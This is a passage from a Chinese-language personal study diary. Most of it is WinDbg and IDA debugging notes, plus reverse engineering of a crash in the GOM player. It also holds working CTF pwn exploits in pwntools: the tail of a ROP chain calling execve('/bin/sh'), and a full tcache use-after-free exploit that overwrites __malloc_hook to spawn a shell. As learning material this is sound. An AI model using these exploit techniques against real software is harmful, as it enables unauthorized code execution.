punctuation">[</span><span class="token string">'execve'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basep <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r12_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>execve<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-7"><a href="#7-7" class="headerlink" title="#7.7"></a>#7.7</h2><p>今天有点摆烂了…欸，周末嘛（bushi），主要是前一天睡的有点晚，直接润去姐姐家睡到了下午（）。晚上摸索了一下<code>windbg</code>基本用法</p><h3 id="windbg"><a href="#windbg" class="headerlink" title="windbg"></a>windbg</h3><p>打开文件：文件选项卡中打开exe文件</p><p>设置符号路径  ： <code>.sympath srv*</code></p><p>加载符号： <code>.reload</code></p><p>运行：<code>g</code></p><p>设置断点： <code>bp addr</code>  </p><p>查看堆栈状态：<code>kb</code></p><p>查看反汇编代码：<code>u addr</code></p><p>查看内容内容：双字：<code>dd/dc addr</code></p><p>​    Unicode 字符串 ：<code>du addr</code></p><p>​    十六进制双字：<code>dD addr</code></p><p>​    内存内容的指针：<code>dp addr</code></p><p>​    字：<code>dw addr</code></p><p>​    字节：<code>db addr</code></p><p>​    ASCII字符：<code>da addr</code></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">0:000> dc 0040000000400000  00405000 00406000 00407000 00408000  <span class="token punctuation">.</span>P<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>p<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>00400010  00409000 0040A000 0040B000 0040C000  <span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>0:000> du 0040000000400000  <span class="token string">"Hello, world!"</span>00400010  <span class="token string">"This is a test string."</span>0:000> dd 0040000000400000  00405000 00406000 00407000 0040800000400010  00409000 0040A000 0040B000 0040C0000:000> db 0040000000400000  48 65 6C 6C 6F 2C 20 77-6F 72 6C 64 21 00 00 00  Hello<span class="token punctuation">,</span> world!<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>00400010  54 68 69 73 20 69 73 20-61 20 74 65 73 74 20 73  This is a test s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看寄存器：<code>r</code>&#x2F;   <code>r register</code></p><p>修改寄存器：<code>r register = value</code></p><p>单步执行：不进入函数：<code>p</code></p><p>​         进入函数：<code>t</code></p><h2 id="7-8"><a href="#7-8" class="headerlink" title="#7.8"></a>#7.8</h2><p>今天还在捣鼓<code>windbg</code>，有点难绷…</p><h3 id="windbg-1"><a href="#windbg-1" class="headerlink" title="windbg"></a>windbg</h3><p><code>windbg</code>作用和<code>pwndbg</code>类似，还需要结合<code>IDA</code>逆向分析</p><p>显示指定的加载模块:<code>lm</code></p><p>bp、bu 和 bm 命令设置新的断点，但它们具有不同的特征：</p><p>●bp (设置断点) 命令在命令中指定的断点位置的地址处设置新的断点。 如果在设置断点时调试器无法解析断点位置的地址表达式，则 bp 断点将自动转换为 bu 断点。 使用 bp 命令创建在卸载模块时不再处于活动状态的断点</p><p>●bu (设置未解析断点) 命令设置延迟或未解析的断点。 bu 断点是在对命令中指定的断点位置的符号引用上设置的， (不在地址) 上，每当解析具有引用的模块时，就会激活该断点。 有关这些断点的详细信息</p><p>●bm (设置符号断点) 命令在与指定模式匹配的符号上设置新的断点。 此命令可以创建多个断点。 默认情况下，匹配模式后， bm 断点与 bu 断点相同。 也就是说， bm 断点是在符号引用上设置的延迟断点。 但是，bm &#x2F;d 命令会创建一个或多个 bp 断点。 每个断点在匹配位置的地址上设置，不跟踪模块状态</p><p>●.bpcmds&#x2F;bl 查看断点情况</p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; bm myprogram!mem*   4: 0040d070 MyProgram!memcpy  5: 0040c560 MyProgram!memmove  6: 00408960 MyProgram!memset0:000&gt; bp MyTest+0xb 7 #前六次忽略此断点，第七次传递时，执行会停止<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-9"><a href="#7-9" class="headerlink" title="#7.9"></a>#7.9</h2><p>早上被摇去写了个<code>uaf</code>，然后一直在装<code>FakePDB</code>，救命，装不动了</p><h3 id="pwn题"><a href="#pwn题" class="headerlink" title="pwn题"></a>pwn题</h3><p><code>uaf</code>，限制15个堆，直接<code>tcachebin attack</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">readint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">15</span> <span class="token operator">||</span> <span class="token operator">!</span>ptr_list<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"NOOOOOOO!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr_list<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OKK!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice >>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice >>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice >>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice >>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ebca0</span>malloc_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseone <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2a5</span><span class="token punctuation">,</span> <span class="token number">0x4f302</span><span class="token punctuation">,</span> <span class="token number">0x10a2fc</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseadd<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-10"><a href="#7-10" class="headerlink" title="#7.10"></a>#7.10</h2><p>安装<code>FakePDB</code>，发现有<code>release</code>版本，唉前一天白浪费那么多时间去编译啦，但是还是只能生成<code>json</code>，<code>pdb</code>还是没生成的起来。然后被老师摇去看论文啦，一万多字的专业性文章真是考验专注力和耐心，过程中和学长交流才发现，其实<code>kb</code>查看栈回溯里的内容就行</p><h3 id="windbg-2"><a href="#windbg-2" class="headerlink" title="windbg"></a>windbg</h3><p>之前对<code>windbg</code>的误区是它既然不能识别函数那不就不能追溯到经过了哪些函数，昨天学到下断点是<code>module_name+address</code>，今天学长提到<code>kb</code>再去看了一下才发现这里的栈回溯就是<code>module_name+address</code>形式的代替了函数</p><p>例如这里的<code>GOM32Q_vc120_ReleaseQC+0x6371de</code>再去看<code>IDA</code>对应的就是<code>0x400000+0x6371de=0xA371DE</code>，即函数<code>_invoke_watson</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> kb <span class="token punctuation">\</span># ChildEBP RetAddr      Args to Child              WARNING: Stack unwind information not available. Following frames may be wrong.00 017eefc0 00e971cc     00000000 00000000 00000000 GOM32Q_vc120_ReleaseQC+0x6371de01 017eefe4 00a66a63     017ef0ec 00000104 05989178 GOM32Q_vc120_ReleaseQC+0x6371cc02 017ef338 00a4d040     0ada2b98 00000001 00d6723a GOM32Q_vc120_ReleaseQC+0x206a6303 017ef3fc 00d682e2     00ffb640 0ada2b98 00010004 GOM32Q_vc120_ReleaseQC+0x1ed04004 017ef41c 00d6392f     0000c322 0ada2b98 00010004 GOM32Q_vc120_ReleaseQC+0x5082e205 017ef48c 00d640ea     0ad8e898 000408f4 0000c322 GOM32Q_vc120_ReleaseQC+0x50392f06 017ef4ac 771116eb     000408f4 0000c322 0ada2b98 GOM32Q_vc120_ReleaseQC+0x5040ea<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>追溯到最后一个函数如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __cdecl __noreturn <span class="token function">_invoke_watson</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token class-name">wchar_t</span> <span class="token operator">*</span>Expression<span class="token punctuation">,</span><span class="token keyword">const</span> <span class="token class-name">wchar_t</span> <span class="token operator">*</span>FunctionName<span class="token punctuation">,</span><span class="token keyword">const</span> <span class="token class-name">wchar_t</span> <span class="token operator">*</span>FileName<span class="token punctuation">,</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> LineNo<span class="token punctuation">,</span><span class="token class-name">uintptr_t</span> Reserved<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">IsProcessorFeaturePresent</span><span class="token punctuation">(</span><span class="token number">0x17u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token function">__fastfail</span><span class="token punctuation">(</span><span class="token number">5u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">_call_reportfault</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1073740777</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">__crtTerminateProcess</span><span class="token punctuation">(</span><span class="token number">0xC0000417</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-11"><a href="#7-11" class="headerlink" title="#7.11"></a>#7.11</h2><p>今天彻底明白怎么用<code>windbg</code>结合<code>IDA</code>调试啦，不容易。对<code>GOM</code>进行了一些逆向，然后又被摇去看论文了嘶，什么时候我能看得懂这个论文在写什么呢（逃</p><h3 id="windbg基础用法"><a href="#windbg基础用法" class="headerlink" title="windbg基础用法"></a>windbg基础用法</h3><h4 id="运行前"><a href="#运行前" class="headerlink" title="运行前"></a>运行前</h4><p>打开文件：<code>文件 -&gt; Launch executable</code></p><p>查看反编译汇编：<code>View -&gt; Layouts -&gt; Disassembly</code></p><p>设置符号路径：<code>.sympath srv*</code></p><p>加载符号：<code>.reload</code></p><h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><p>运行：<code>g</code></p><p>单步执行不进入函数：<code>p</code></p><p>单步执行进入函数：<code>t</code></p><h4 id="查看-x2F-修改状态"><a href="#查看-x2F-修改状态" class="headerlink" title="查看&#x2F;修改状态"></a>查看&#x2F;修改状态</h4><p>查看堆栈状态：<code>kb</code></p><p>查看寄存器：<code>r</code> &#x2F; <code>r register</code></p><p>修改寄存器：<code>r register = value</code></p><h4 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h4><p>查看指定地址反编译代码：<code>u addr</code></p><p>以双字的形式查看内存：</p><p><code>dd addr / register</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; dd 0040000000400000  00405000 00406000 00407000 0040800000400010  00409000 0040A000 0040B000 0040C000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>dc addr / register</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; dc 0040000000400000  00405000 00406000 00407000 00408000  .P...&#96;...p...&#96;...00400010  00409000 0040A000 0040B000 0040C000  ..&#96;...&#96;...&#96;...&#96;...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以<code>Unicode</code>字符串的形式查看内存：<code>du addr / register</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; du 0040000000400000  &quot;Hello, world!&quot;00400010  &quot;This is a test string.&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以字节的形式查看内存：<code>db addr / register</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; db 0040000000400000  48 65 6C 6C 6F 2C 20 77-6F 72 6C 64 21 00 00 00  Hello, world!...00400010  54 68 69 73 20 69 73 20-61 20 74 65 73 74 20 73  This is a test s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以ASCII字符的形式查看内存：<code>da addr / register</code></p><p>以字的形式查看内存：<code>dw addr / register</code></p><p>以十六进制双字的形式查看内存：<code>dD addr / register</code></p><p>以内存内容的指针的形式查看内存：<code>dp addr / register</code></p><h4 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h4><p>查看断点详细情况：<code>bl</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; bl     0 e Disable Clear  00000000 e 1 0001 (0001)  0:****      1 e Disable Clear  00300003     0001 (0001)  0:**** GOM32Q_vc120_ReleaseQC+0x3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>查看断点：<code>.bpcmds</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; .bpcmdsba0 e1 0x00000000 ;bp1 0x00300003 ;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>下断点：</p><p><code>bp</code> ：设置断点，在指定断点位置设置新的断点，如果调试器无法解析断点位置的地址表达式，则自动转换为bu断点，使用bp命令创建在卸载模块时不再处于活动状态的断点</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> bp MyTest+0xb <span class="token number">7</span> <span class="token comment">#前六次忽略此断点，第七次传递时，执行会停止</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>bm</code>：设置符号断点，命令在与指定模式匹配的符号上设置新的断点。 此命令可以创建多个断点。 默认情况下，匹配模式后，bm断点与bu断点相同。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> bm myprogram<span class="token operator">!</span>mem*   <span class="token number">4</span>: 0040d070 MyProgram<span class="token operator">!</span>memcpy  <span class="token number">5</span>: 0040c560 MyProgram<span class="token operator">!</span>memmove  <span class="token number">6</span>: 00408960 MyProgram<span class="token operator">!</span>memset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>bu</code>：设置未解析断点，命令设置延迟或未解析的断点。bu断点是在对命令中指定的断点位置的符号引用上设置的， (不在地址) 上，每当解析具有引用的模块时，就会激活该断点。 </p><h3 id="windbg结合IDA逆向分析"><a href="#windbg结合IDA逆向分析" class="headerlink" title="windbg结合IDA逆向分析"></a>windbg结合IDA逆向分析</h3><h4 id="通过IDA中的地址下断点"><a href="#通过IDA中的地址下断点" class="headerlink" title="通过IDA中的地址下断点"></a>通过IDA中的地址下断点</h4><p>地址偏移 &#x3D; <code>IDA中的地址 - IDA中的基址</code></p><p>查看模块名称&#x2F;地址：<code>lm</code> （基址为<code>start</code>一列</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> lmstart    end        module name00300000 010f9000   GOM32Q_vc120_ReleaseQC   <span class="token punctuation">(</span>no symbols<span class="token punctuation">)</span>           05990000 05a4c000   swscale_gp_5   <span class="token punctuation">(</span>deferred<span class="token punctuation">)</span>             05a50000 05d69000   avutil_gp_56   <span class="token punctuation">(</span>deferred<span class="token punctuation">)</span>             05d70000 07366000   avcodec_gp_58   <span class="token punctuation">(</span>deferred<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取<code>windbg</code>中的地址：<code>模块基址 + 地址偏移</code></p><p>下断点：<code>bu 模块名称 + 地址偏移</code> &#x2F; <code>bu windbg中的地址</code></p><p>例如：<code>IDA</code>中的基址为<code>0x400000</code>，要在<code>IDA</code>中地址为<code>0x500000</code>的位置下断点，则地址偏移为<code>0x500000 - 0x400000 = 0x100000</code>，假设<code>lm</code>查看模块名为<code>test</code>，该模块基址为<code>0x200000</code>，则在<code>windbg</code>中的地址就是<code>0x300000</code>，那么下断点就是<code>du test + 0x100000</code> &#x2F; <code>du 0x300000</code></p><h4 id="通过栈回溯找到IDA中对应函数"><a href="#通过栈回溯找到IDA中对应函数" class="headerlink" title="通过栈回溯找到IDA中对应函数"></a>通过栈回溯找到IDA中对应函数</h4><p>栈回溯查看堆栈情况：<code>kb</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> kb <span class="token comment"># ChildEBP RetAddr      Args to Child              </span>WARNING: Stack unwind information not available. Following frames may be wrong.00 014fedc0 009371cc     00000000 00000000 00000000 GOM32Q_vc120_ReleaseQC+0x6371de01 014fede4 00506a63     014feeec 00000104 0f4aeea8 GOM32Q_vc120_ReleaseQC+0x6371cc02 014ff138 004ed040     0f4cf948 00000001 0080723a GOM32Q_vc120_ReleaseQC+0x206a6303 014ff1fc 008082e2     00a9b640 0f4cf948 00010004 GOM32Q_vc120_ReleaseQC+0x1ed04004 014ff21c 0080392f     0000c391 0f4cf948 00010004 GOM32Q_vc120_ReleaseQC+0x5082e205 014ff28c 008040ea     0f4cd4c0 00010a66 0000c391 GOM32Q_vc120_ReleaseQC+0x50392f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到形如<code>模块名+地址偏移</code>的栈回溯，要找到在<code>IDA</code>中的对应基址只需要用模块名加上的这个地址偏移（即加号后面部分）再加上<code>IDA</code>基址即可</p><p>例如：<code>GOM32Q_vc120_ReleaseQC+0x6371de</code>，则地址偏移为<code>0x6371de</code>，IDA基址为<code>0x400000</code>，那么在<code>IDA</code>中的地址就是<code>0x6371de + 0x400000 = 0xA371DE</code></p><h3 id="GOM逆向"><a href="#GOM逆向" class="headerlink" title="GOM逆向"></a>GOM逆向</h3><p><code>kb</code>查看栈回溯找到的第一个函数，是触发<code>crash</code>时的反调试</p><p>再往上追溯两个函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">_invalid_parameter</span><span class="token punctuation">(</span><span class="token class-name">wchar_t</span> <span class="token operator">*</span>Expression<span class="token punctuation">,</span><span class="token class-name">wchar_t</span> <span class="token operator">*</span>FunctionName<span class="token punctuation">,</span><span class="token class-name">wchar_t</span> <span class="token operator">*</span>FileName<span class="token punctuation">,</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> LineNo<span class="token punctuation">,</span><span class="token class-name">uintptr_t</span> Reserved<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v5<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// eax</span>v5 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">DecodePointer</span><span class="token punctuation">(</span>dword_CE8C44<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token 